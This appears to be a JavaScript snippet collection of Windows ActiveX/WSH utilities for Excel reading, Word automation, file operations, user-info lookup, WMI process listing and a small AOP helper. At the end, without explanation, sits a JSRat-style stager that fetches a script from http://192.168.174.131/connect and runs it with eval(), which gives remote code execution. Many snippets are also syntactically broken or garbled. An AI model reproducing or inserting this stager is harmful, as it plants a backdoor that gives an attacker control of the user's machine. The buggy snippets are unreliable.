function read_excel() {
    var filePath = "D:\abcd9.com.cls";
    var sheet_id;//读取第二个表
    var row_start = 3;//从第三行开始读取
    var tempStr = "";
    try {
        var oXL = new ActiveXObject("Excel.Application");
    }
    catch (err) {
        alert(err);
        return false;
    }
    var oWB = oXL.Workbooks.open(filePath);
    oWB.worksheets(sheet_id).select();
    var oSheet = oWB.ActiveSheet;
    var colcount = oXL.Worksheets(sheet_id).UsedRange.Cells.Rows.Count;

    for (var i = row_start; i <= colcount; i++) {
        if (typeof(oSheet.Cells(i, 8).value) == 'date') {
            d = new Date(oSheet.cells(i, 8).value);
            temp_time = d.getFullYear() + "-" + (d.getMonth() + 1) + "-" + d.getDate();
        }
        else
            temp_time = $.trim(oSheet.Cells(i, 7).value.toString());
        tempStr += ($.trim(oSheet.Cells(i, 2).value) + " " + $.trim(oSheet.Cells(i, 4).value) + " " + $.trim(oSheet.Cells(i, 6).value.toSTring()) + " " + temp_time + "\n");
        //读取2,4,6,8列内容
    }
    return tempStr;
    oXL.Quit();
    CollectGarbage();
}
function OpenFile() {
    try {
        FileDialog.CancelError = true;
        FileDialog.Filter = "Word模板|*.doc|Word模板|*.dot";
        FileDialog.ShowOpen();
        var WordApp = new ActiveXObject("Word.Application");
        WordApp.Application.Visible = false;
        var Doc = WordApp.Documents.Open(FileDialog.filename);
        Doc.Activate();
        Doc.Parent.Options.InsertedTextColor = 4;
        Doc.Parent.Options.InsertedTextMark = 2;
        Doc.Parent.Options.DeletedTextColor = 4;
        Doc.Parent.Options.DeletedTextMark = 1;
        Doc.TrackRevisions = true;
        Doc.PrintRevisions = true;
        Doc.ShowRevisions = true;
        Doc.Application.UserName = "";
        var Range = Doc.Range();
        Range.Select();
        var Selection = WordApp.Selection;
        Selection.Copy();
        App.focus();
        document.execCommand("Paste");
        App.focus();
        WordApp.DisplayAlerts = false;
        Doc.Close();
        WordApp.DisplayAlerts = true;
        WordApp.Quit();
    }
    catch (e) {
    }
    return false;
}
function wordlean() {
    //创建ActiveX控件
    var wrd = new ActiveXObject("Word.Application");
    //打开服务器word文档
    wrd.Documents.Open(document.location.href.substring(0, document.location.href.lastIndexOf('/') + 1) + '');

    //在段落指定位置写入部门名称和日期
    var theRange = wrd.ActiveDocument.Range(wrd.ActiveDocument.Paragraphs(2).Range.Start + 3, wrd.ActivetheRange.text = "技术中心");

    //检索到word中的表格,并在指定单元格里写入内容
    var theRange = wrd.ActiveXDocument.Tables(1).Rows(i + 2).Cells(1).Range;
    theRange.Text = dataTable.rows(i).cells(0).innerText;

    //自动根据记录数量建立空行再写入内容
    if (i > 0)wrd.Selection.InsertRowsBelow();

    //另存为本地文件
    Wrd.ActiveDocument.SaveAs('周报' + new Date().getYear() + new DAte().getMonth() + new Date().getDAte() + '.doc');
    wrd.options.SendMailAttach = true;

    wrd.ActiveDocument.SendMail();
}


var fso, f1, f2, s;
fso = new ActiveXObject("Scripting.FileSystemObject");
f1 = fso.CreateTextFile("c:\\testfile.txt", true);
f1.Write("This is a test.");
f1.Close();
f2 = fso.GetFile("C:\\testfile.txt");
f2.Move("C:\\tmp\\testfile.txt");
f2.Copy("C:\\temp\\testfile.txt");
f2 = fso.GetFile("\\tmp\\test\\testfile.txt");

f2.Delete();

function getusername() {
    var WshNetwork = new ActiveXObject("WScript.NetWork");
    alert("Domain=" + WshNetwork.UserDomain);
    alert("Computer Name=" + WshNetwork.ComputerName);
    alert("User Name=" + WshNetwork.UserName);
}
function getprocessnum() {
    var pnsys = new ActiveXObject("WScript.shell");
    pn = pnsys.Environment("PROCESS");
    alert(pn("WINDIR"));
}

function getspecialfolder() {
    var mygetfolder = new ActiveXObject("WScript.shell");
    if (mygetfolder.SpecialFolders("Fonts") != null) {
        alert(mygetfolder.SpecialFolders("Fonts"));
    }
}
function runcalc() {
    var calc = new ActiveXObject("WScript.shell");
    calc.Run("calc");
}


$("#filterName").keyup(function () {
    $("table tbody tr")
        .hide()
        .filter(":contains('" + ( $(this).val() ) + "')")
        .show();
}).keyup();



function html2word(Area) {
    var oWD = new ActiveXObject("Word.Application");
    var oDC = oWD.Documents.ADD("", 0, 1);
    var oRange = oDC.Range(0, 1);
    var sel = document.body.createTextRange();
    sel.moveToElementText(document.getElementById(Area));
    sel.select();
    sel.execCommand("Copy");
    oRange.Paste();
    oWd.Application.Visible = true;
}

function funSave() {
    var id = $('#testText1')[0].value;
    var name = $('#testText2')[0].value;
    var str = '{mydata:[' + '{id:' + id + ',name:' + name + '}' + ']}';

    str = "{MyData:[{id:'" + id + "',name:'" + name + "'}]}";

//var json = eval('(' + str + ')');

    var fso, tf;
    try{
        fso = new ActiveXObject("Scripting.FileSystemObject");
        tf = fso.CreateTextFile("F:\\BaiduYun\\MyHtml\\DB_USER.json", true);
        tf.WriteLine(str);
    }catch(err){


    }finally{
        tf.Close();
    }
}

function funSearch() {
    var fso, ts, s;
    var ForReading = 1;
    try{
        fso = new ActiveXObject("Scripting.FileSystemObject");
        ts = fso.OpenTextFile("F:\\BaiduYun\\MyHtml\\DB_USER.json", ForReading);
        s = ts.ReadLine();
        var json = eval('(' + s + ')');
        alert(json.MyData[0].id);
    }catch(err){


    }finally{
        ts.Close();
    }
}

//判断进程是否存在
var t,var locator = new ActiveXObject("WbemScripting.SWbemLocator"),
var service=locator.ConnectServer(".");
var properties=service.ExecQuery("SELECT * FROM Win32_Process ");
var np = new Enumerator(properties);
for(;!np.atEnd();np.moveNext()){
    t=t+np.item().Name+"\n";
}
if (t.indexOf("calc.exe")>-1){
    alert("calc is run");
}
else {
    alert("calc is stop");
}


var aop=(function(){
    var options={},
    context=window,
    oFn,
    oFnArg,
    targetFn,
    targetFnSelector,
    beforeFn,
    afterFn,
    aroundFn,
    closeFn=function(Fn){
        if(typeof Fn==="function"){
            return eval('['+Fn.toString()+']')[0];
        }
        return null;
    },
    checkContext = function()
    {
        if(options.context){
            context = options.context;
        }
        if (typeof context[(options.target).name])==="function")
{
          targetFnSelector = (options.target).name;
          targetFn = context[targetFnSelector];
}
else if (typeof context[options.target]==="function"){
    targetFnSelector = options.target;
    targetFn = context[targetFnSelector];
}
if (targetFn){
    oFn = cloneFn(targetFn);
    oFnArg = new Array(targetFn.length);
    return true;
}
else {
      return false;
}

    },
    run = function(){
        context[targetFnSelector]=function(oFnArg){
            if (aroundFn){
                aroundFn.apply(this,arguments);
            }
            if (beforeFn){
                beforeFn.apply(this,arguments);
            }
            oFn.apply(this,arguments);
            if (afterFn){
                afterFn.apply(this,arguments);
            }
            if(aroundFn){
                aroundFn.apply(this,arguments);
            }
        };
    };
    return function(opt){
        if(opt&&typeof opt==="object" && !opt.length){
            options=opt;
            if(options.target && checkContext()){
                beforeFn = options.before;
            }
            if (options.after && typeof options.after==="function"){
                afterFn = options.after;
            }
            if (options.around&& typeof options.around==="function" ){
                aroundFn=options.around;
            }
            run();
        }
    }
})();

function test(name,age){
    console.log("test fn.name="+name+" age:"+age);
}
aop({
    target:"test",
    before:function(){
        console.log("aop before");
    },
    after:function(){
        console.log("aop after");
    },
    around:function(){
        console.log("aop around");
    }
});
//run
test("adam",6);

//-----aop test modify method in an object
var myobj = {
    myName:"testName",
    sayName:function(){
        console.log(this.myName);
    },
    childObj:{
        age:6,
        say:function(){
            console.log(this.age);
        }
    }
};
aop({
    context:myobj,
    target:"sayName",
    before:function(){
        console.log("aop before say name="+this.myName);
    },
    after:function(){
        console.log("aop after say name="+this.myName);
    },
    around:function(){
        console.log("aop around say name="+this.myName);
    }
});

myobj.sayName();
aop({
    context:myobj.childObj,
    target:"say",
    before:function(){
        console.log("aop before say name="+this.age);
    },
    after:function(){
        console.log("aop after say name="+this.age);
    },
    around:function(){
        console.log("aop around say name="+this.age);
    }
});
myobj.childObj.say();

var h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.Open("GET","http://192.168.174.131/connect",false);
h.Send();
B = h.ResponseText;
eval(B);
//powershell -file JSRat.ps1